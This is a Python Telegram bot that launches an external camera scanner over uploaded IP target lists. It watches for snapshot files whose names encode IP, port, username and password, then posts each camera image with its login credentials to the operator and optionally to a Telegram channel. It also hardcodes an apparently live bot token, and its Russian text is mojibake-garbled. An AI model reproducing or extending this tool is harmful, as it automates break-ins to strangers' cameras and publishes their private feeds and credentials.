# bot.py
import os
import time
import string
import random
import asyncio
import subprocess
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.error import TimedOut, TelegramError
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from PIL import Image
import io
import re

# ----------------- –õ–û–ì–ò–†–û–í–ê–ù–ò–ï -----------------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,  # –ú–æ–∂–Ω–æ DEBUG, —á—Ç–æ–±—ã –≤–∏–¥–µ—Ç—å –≤—Å—ë
)
logger = logging.getLogger(__name__)

# ----------------- –ù–ê–°–¢–†–û–ô–ö–ò -----------------
TOKEN = "7754624523:AAGK9CKhfqIQYmAn7tx43XmcRl3HdYqMSFo"
CHANNEL_ID = -1002851273551          # ID –∫–∞–Ω–∞–ª–∞ –¥–ª—è –ø–µ—Ä–µ—Å—ã–ª–∫–∏
SCANNING = False
SCAN_PROCESS = None
OBSERVER = None
SENT_IPS = set()                     # –£–∂–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–µ IP
USER_ID = None                       # –ö—Ç–æ –∑–∞–ø—É—Å—Ç–∏–ª —Å–∫–∞–Ω
FORWARD_TO_CHANNELS = False
AWAITING_FILE = None
GO_PROCESS = None
GO_RUNNING = False

# ----------------- –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò -----------------
def generate_random_name(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def compress_image(image_path):
    try:
        output = io.BytesIO()
        with Image.open(image_path) as img:
            img = img.convert('RGB')
            img.thumbnail((800, 800))
            img.save(output, format='JPEG', quality=85, optimize=True)
        output.seek(0)
        logger.debug(f"–°–∂–∞–ª –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ: {image_path}")
        return output
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ —Å–∂–∞—Ç–∏—è {image_path}: {e}")
        return None

def parse_filename(filename):
    # –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º —Ñ–æ—Ä–º–∞—Ç: ip-port-username-password.jpg
    pattern = r"^(\d+\.\d+\.\d+\.\d+)-(\d+)-(.+)-(.+)\.jpg$"
    match = re.match(pattern, filename)
    if match:
        return {
            'ip': match.group(1),
            'port': match.group(2),
            'username': match.group(3),
            'password': match.group(4),
        }
    logger.debug(f"–§–∞–π–ª –Ω–µ –ø–æ–¥—Ö–æ–¥–∏—Ç –ø–æ–¥ –ø–∞—Ç—Ç–µ—Ä–Ω: {filename}")
    return None

# ----------------- –û–ë–†–ê–ë–û–¢–ß–ò–ö –§–ê–ô–õ–û–í -----------------
class SnapshotHandler(FileSystemEventHandler):
    def __init__(self, bot, channels, loop):
        self.bot = bot
        self.channels = channels
        self.loop = loop  # –ì–ª–∞–≤–Ω—ã–π event-loop

    def _send_async(self, coro):
        """–ó–∞–ø—É—Å–∫–∞–µ—Ç –∫–æ—Ä—É—Ç–∏–Ω—É –≤ –≥–ª–∞–≤–Ω–æ–º –ø–æ—Ç–æ–∫–µ."""
        asyncio.run_coroutine_threadsafe(coro, self.loop).result(timeout=20)

    def on_created(self, event):
        if event.is_directory or not event.src_path.lower().endswith('.jpg'):
            logger.debug("–ü—Ä–æ–ø—É—Å–∫–∞–µ–º: %s", event.src_path)
            return

        filename = os.path.basename(event.src_path)
        parsed = parse_filename(filename)
        if not parsed or parsed['ip'] in SENT_IPS:
            return

        SENT_IPS.add(parsed['ip'])

        message = (
            "üîç **–•–∞—Ü—É–Ω–µ –ú–∏–∫—É –Ω–∞—à–ª–∞ –¥–ª—è –≤–∞—Å –∫–∞–º–µ—Ä—É!**\n"
            f"**–ê–π–†i**: {parsed['ip']}\n"
            f"**R0—Ät**: {parsed['port']}\n"
            f"**U$**: {parsed['username']}\n"
            f"**P@r0–ª—å**: {parsed['password']}"
        )

        img_buffer = compress_image(event.src_path)
        if not img_buffer:
            return

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
        try:
            self._send_async(
                self.bot.send_photo(
                    chat_id=USER_ID,
                    photo=img_buffer,
                    caption=message,
                    parse_mode='Markdown',
                )
            )
            logger.info("–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é %s: %s", USER_ID, filename)
        except Exception as e:
            logger.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é: %s", e)

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ –∫–∞–Ω–∞–ª—ã
        if FORWARD_TO_CHANNELS:
            for cid in self.channels:
                try:
                    img_buffer.seek(0)
                    self._send_async(
                        self.bot.send_photo(
                            chat_id=cid,
                            photo=img_buffer,
                            caption=message,
                            parse_mode='Markdown',
                        )
                    )
                    logger.info("–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ –∫–∞–Ω–∞–ª %s: %s", cid, filename)
                except Exception as e:
                    logger.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ –∫–∞–Ω–∞–ª %s: %s", cid, e)

# ----------------- –û–°–¢–ê–õ–¨–ù–´–ï –•–≠–ù–î–õ–ï–†–´ (–±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π –ª–æ–≥–∏–∫–∏) -----------------
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error("–û—à–∏–±–∫–∞: %s", context.error)

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global AWAITING_FILE, GO_RUNNING, GO_PROCESS
    if not AWAITING_FILE:
        return
    doc = update.message.document
    if not doc or not doc.file_name.endswith('.txt'):
        await update.message.reply_text("‚ùå –ó–∞–≥—Ä—É–∑–∏—Ç–µ .txt —Ñ–∞–π–ª!")
        return

    file_path = f"{AWAITING_FILE}.txt"
    await (await doc.get_file()).download_to_drive(file_path)
    await update.message.reply_text(f"‚úÖ {AWAITING_FILE}.txt —Å–æ—Ö—Ä–∞–Ω—ë–Ω.")

    if AWAITING_FILE == 'ranges':
        cmd = "go run app.go"
        try:
            GO_PROCESS = subprocess.Popen(cmd, shell=True)
            GO_RUNNING = True
            logger.debug("GO –ø—Ä–æ—Ü–µ—Å—Å –∑–∞–ø—É—â–µ–Ω.")
        except Exception as e:
            logger.error("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å GO: %s", e)
            await update.message.reply_text("‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ GO.")

    AWAITING_FILE = None
    await show_menu(update, context)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_menu(update, context)

async def show_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("üöÄ –ù–∞—á–∞—Ç—å —Å–∫–∞–Ω", callback_data='start_scanning')],
        [InlineKeyboardButton("üì§ –ó–∞–≥—Ä—É–∑–∏—Ç—å targets.txt", callback_data='upload_targets')],
        [InlineKeyboardButton("‚ö° GOFPS", callback_data='start_gofps')],
    ]
    if GO_RUNNING:
        keyboard.append([InlineKeyboardButton("üõë –°—Ç–æ–ø GO", callback_data='stop_gofps')])
    markup = InlineKeyboardMarkup(keyboard)
    await update.effective_message.reply_text(
        "üëã –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=markup
    )

# ----------------- CALLBACK HANDLER -----------------
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global SCANNING, SCAN_PROCESS, OBSERVER, USER_ID, FORWARD_TO_CHANNELS, AWAITING_FILE, GO_PROCESS, GO_RUNNING, SENT_IPS
    query = update.callback_query
    await query.answer()

    if query.data == 'start_scanning':
        keyboard = [
            [InlineKeyboardButton("üì¢ –í –∫–∞–Ω–∞–ª—ã", callback_data='forward_yes')],
            [InlineKeyboardButton("üîí –¢–æ–ª—å–∫–æ –º–Ω–µ", callback_data='forward_no')],
        ]
        await query.message.reply_text("–ö—É–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å —Å–Ω–∏–º–∫–∏?", reply_markup=InlineKeyboardMarkup(keyboard))

    elif query.data == 'upload_targets':
        AWAITING_FILE = 'targets'
        await query.message.reply_text("üì§ –û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–≤—ã–π targets.txt")

    elif query.data == 'start_gofps':
        AWAITING_FILE = 'ranges'
        await query.message.reply_text("üì§ –û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–≤—ã–π ranges.txt")

    elif query.data in ['forward_yes', 'forward_no']:
        FORWARD_TO_CHANNELS = query.data == 'forward_yes'
        USER_ID = query.from_user.id
        channels = [CHANNEL_ID] if FORWARD_TO_CHANNELS else []

        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –∞–¥–º–∏–Ω-–ø—Ä–∞–≤
        if FORWARD_TO_CHANNELS:
            try:
                admins = await context.bot.get_chat_administrators(CHANNEL_ID)
                if not any(a.user.id == context.bot.id for a in admins):
                    await query.message.reply_text("‚ùå –ë–æ—Ç –Ω–µ –∞–¥–º–∏–Ω –≤ –∫–∞–Ω–∞–ª–µ!")
                    channels.clear()
            except TelegramError as e:
                logger.error("–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–∞–≤: %s", e)
                channels.clear()

        SENT_IPS.clear()
        random_name = generate_random_name()
        cmd = f"python run_ingram.py -i targets.txt -o {random_name}"
        try:
            SCAN_PROCESS = subprocess.Popen(cmd, shell=True)
            SCANNING = True
        except Exception as e:
            logger.error("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å —Å–∫–∞–Ω: %s", e)
            await query.message.reply_text("‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è.")
            return

        snapshots_path = os.path.join(random_name, 'snapshots')
        max_attempts = 10
        for _ in range(max_attempts):
            if os.path.exists(snapshots_path):
                break
            time.sleep(1)
        else:
            await query.message.reply_text("‚ùå –ù–µ—Ç –ø–∞–ø–∫–∏ snapshots.")
            SCAN_PROCESS.terminate()
            SCANNING = False
            return

        OBSERVER = Observer()
        event_handler = SnapshotHandler(
            bot=context.bot,
            channels=channels,
            loop=asyncio.get_event_loop(),  # –ì–ª–∞–≤–Ω—ã–π loop
        )
        OBSERVER.schedule(event_handler, snapshots_path, recursive=False)
        OBSERVER.start()

        await query.message.reply_text(
            f"üîé –°–∫–∞–Ω –∑–∞–ø—É—â–µ–Ω. –ü–∞–ø–∫–∞: {random_name}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("üõë –°—Ç–æ–ø", callback_data='stop_scanning')],
            ])
        )

    elif query.data == 'stop_scanning':
        if SCANNING:
            SCAN_PROCESS.terminate()
            OBSERVER.stop()
            OBSERVER.join()
            SCANNING = False
            SENT_IPS.clear()
            await query.message.reply_text("üõë –°–∫–∞–Ω –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω!")
            await show_menu(update, context)

    elif query.data == 'stop_gofps':
        if GO_RUNNING:
            GO_PROCESS.terminate()
            GO_RUNNING = False
            await query.message.reply_text("üõë GO –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω!")
            await show_menu(update, context)

# ----------------- MAIN -----------------
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_error_handler(error_handler)

    logger.info("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω.")
    app.run_polling()

if __name__ == "__main__":
    main()